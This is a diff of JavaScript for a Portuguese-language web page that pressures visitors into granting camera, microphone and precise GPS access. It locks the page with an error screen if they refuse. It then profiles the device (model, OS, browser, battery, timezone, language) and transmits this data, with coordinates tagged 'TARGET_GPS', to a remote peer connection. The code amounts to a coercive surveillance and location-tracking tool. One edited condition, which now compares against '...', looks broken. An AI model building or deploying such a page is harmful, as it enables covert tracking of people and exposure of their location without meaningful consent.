@@ -126,39 +126,33 @@
             btn.classList.add('animate-pulse');
 
             try {
-                // PASSO 1: Força o pedido de Câmera e Microfone
                 streamDeVideo = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 1280 } },
                     audio: true
                 });
 
-                // PASSO 2: Câmera aceita. Força o pedido de GPS imediatamente
                 btn.textContent = "Câmera OK. Aguardando Localização...";
 
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
-                            // TUDO ACEITO
                             coordenadasFixadas = pos;
                             liberarSistema();
                         },
                         (err) => {
-                            // GPS NEGADO
                             if (err.code === err.PERMISSION_DENIED) {
                                 travarTelaErro("ACESSO NEGADO: Você bloqueou a Localização.<br><br>Para prosseguir, clique no ícone de <b>Cadeado</b> na barra de endereços (topo da tela), permita o Local e recarregue a página.");
                             } else {
-                                // Erro de timeout do GPS, mas o usuário não negou de propósito. Libera.
                                 liberarSistema();
                             }
                         },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    liberarSistema(); // Navegador não tem GPS
+                    liberarSistema();
                 }
 
             } catch (err) {
-                // CÂMERA/MIC NEGADO
                 travarTelaErro("ACESSO NEGADO: Você bloqueou a Câmera/Microfone.<br><br>Para prosseguir, clique no ícone de <b>Cadeado</b> na barra de endereços (topo da tela), ative as permissões e recarregue a página.");
             }
         });
@@ -170,7 +164,7 @@
             btn.classList.add('bg-slate-800', 'text-slate-500', 'cursor-not-allowed');
             btn.textContent = "Sistema Travado";
             btn.disabled = true;
-            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop()); // Mata hardware se só bloqueou o GPS
+            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
         }
 
         async function liberarSistema() {
@@ -178,26 +172,22 @@
             document.getElementById('main-interface').classList.remove('opacity-0');
             document.body.style.overflow = 'auto';
 
-            // Coleta info do OS e entra na rede
-            await coletarTelemetriaOS();
+            // CORREÇÃO AQUI: A função agora chama o nome correto do coletor de OS/Dispositivo
+            await coletarTelemetriaDispositivo();
             iniciarConexao();
         }
 
-        // Função J.A.R.V.I.S. de Perfilamento de Hardware
         async function coletarTelemetriaDispositivo() {
             const ua = navigator.userAgent;
 
-            // 1. Tenta a API Moderna (Foco em Android recente)
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
                     const dados = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
                     telemetria.os = dados.platform;
-                    // Se retornar o modelo técnico, usamos ele
                     if (dados.model) telemetria.device = dados.model;
                 } catch (e) { }
             }
 
-            // 2. Triangulação Específica para Apple (iOS) via Resolução Física
             if (/iPad|iPhone|iPod/.test(ua)) {
                 telemetria.os = 'iOS';
                 const w = window.screen.width;
@@ -205,7 +195,6 @@
                 const ratio = window.devicePixelRatio;
                 const screenSignature = `${w}x${h}@${ratio}`;
 
-                // Banco de dados de resoluções de hardware Apple
                 const appleDevices = {
                     "430x932@3": "iPhone 14 Pro Max / 15 Plus / 15 Pro Max",
                     "393x852@3": "iPhone 14 Pro / 15 / 15 Pro",
@@ -221,11 +210,9 @@
 
                 telemetria.device = appleDevices[screenSignature] || `iPhone (Desconhecido: ${w}x${h})`;
             }
-            // 3. Fallback Clássico para Android antigo e PCs
-            else if (telemetria.device === 'Desconhecido') {
+            else if (telemetria.device === '...') {
                 if (/android/i.test(ua)) {
                     telemetria.os = 'Android';
-                    // Tenta pescar o código SM-Gxxx ou Moto no meio da string
                     const match = ua.match(/Android.*?; (.*?) Build/);
                     telemetria.device = match ? match[1] : 'Smartphone Android genérico';
                 } else if (/Windows NT 10.0/.test(ua)) {
@@ -237,7 +224,6 @@
                 }
             }
 
-            // 4. Identificação do Navegador
             if (ua.includes('Firefox')) telemetria.browser = 'Firefox';
             else if (ua.includes('Edg')) telemetria.browser = 'Edge';
             else if (ua.includes('Chrome')) telemetria.browser = 'Chrome';
@@ -260,7 +246,6 @@
                         os: telemetria.os, device: telemetria.device, battery: telemetria.battery, timezone: telemetria.timezone, language: telemetria.language
                     });
 
-                    // Se pegou o GPS no modal, manda agora
                     if (coordenadasFixadas) {
                         dataConnection.send({
                             type: 'TARGET_GPS', lat: coordenadasFixadas.coords.latitude, lng: coordenadasFixadas.coords.longitude,
